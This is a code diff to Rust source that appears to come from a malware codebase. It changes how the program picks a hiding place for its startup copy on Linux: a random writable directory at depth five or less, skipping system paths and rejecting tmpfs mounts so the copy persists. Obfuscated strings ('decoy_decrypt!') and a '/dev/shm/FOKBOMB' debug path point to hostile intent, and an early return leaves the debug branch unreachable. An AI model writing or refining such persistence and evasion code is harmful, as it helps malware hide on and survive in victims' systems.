@@ -2,12 +2,14 @@ use crate::agtools;
 use rand::{RngExt, random, random_range};
 use std::fs;
 use std::fs::{DirEntry, File};
+use std::os::unix::ffi::OsStrExt;
 use std::path::Path;
 use walkdir::WalkDir;
 
 pub(crate) fn get_lin_start(startup: &mut String) {
+    startup.push_str(&get_rnd_dir("/"));
+    return;
     if !cfg!(debug_assertions) {
-        startup.push_str(&get_rnd_dir("/"));
     } else {
         startup.clear();
         startup.push_str("/dev/shm/FOKBOMB");
@@ -48,27 +50,33 @@ pub(crate) fn l_copy(source: &str, target: &str, child: bool) {
 }
 
 pub(crate) fn get_rnd_dir(dir: &str) -> String {
-    let mut selected_dir = String::new();
+    let mut selected_dir = String::with_capacity(256);
 
-    let entries = WalkDir::new(dir).into_iter().filter_map(|e| e.ok());
+    let blacklist: &[&[u8]] = &[b"/dev", b"/proc", b"/sys", b"/run", b"/var", b"/bin"];
+
+    let entries = WalkDir::new(dir)
+        .max_depth(5) // Prevent traversing the entire disk
+        .into_iter()
+        .filter_entry(|e| {
+            let pb = e.path().as_os_str().as_bytes();
+            !blacklist.iter().any(|&prefix| pb.starts_with(prefix))
+        })
+        .filter_map(|e| e.ok());
 
     for entry in entries {
-        if entry.path().starts_with("/dev") {
-            continue;
-        }
+        let path = entry.path();
 
-        if random_range(0..5) != 4 || !__check_dir(entry.path()) {
-            continue;
+        if path.is_dir() && __check_tmpfs(path) && __check_dir(path) {
+            if random::<u8>() % 4 == 0 {
+                if let Some(p_str) = path.to_str() {
+                    selected_dir.push_str(p_str);
+                    return selected_dir;
+                }
+            }
         }
-
-        selected_dir = entry
-            .path()
-            .to_owned()
-            .into_os_string()
-            .into_string()
-            .unwrap();
     }
 
+    selected_dir.push_str(dir);
     selected_dir
 }
 
@@ -98,10 +106,7 @@ pub(crate) fn get_rnd_file() -> String {
             .path()
             .into_os_string()
             .into_string()
-            .expect(
-                &String::from_utf8(decoy_decrypt!(crate::constants::UI_ERR_INVALID_TYPE))
-                    .expect(""),
-            );
+            .unwrap();
     }
 
     result
@@ -120,4 +125,17 @@ fn __check_dir<P: AsRef<Path>>(path: P) -> bool {
         }
         Err(_) => false,
     }
+}
+
+fn __check_tmpfs(path: &Path) -> bool {
+    unsafe {
+        let mut stats: libc::statfs = std::mem::zeroed();
+        let c_path = std::ffi::CString::new(path.as_os_str().as_bytes()).unwrap_or_default();
+
+        if libc::statfs(c_path.as_ptr(), &mut stats) == 0 {
+            return stats.f_type as u32 != 0x01021994;
+        }
+    }
+
+    true
 }
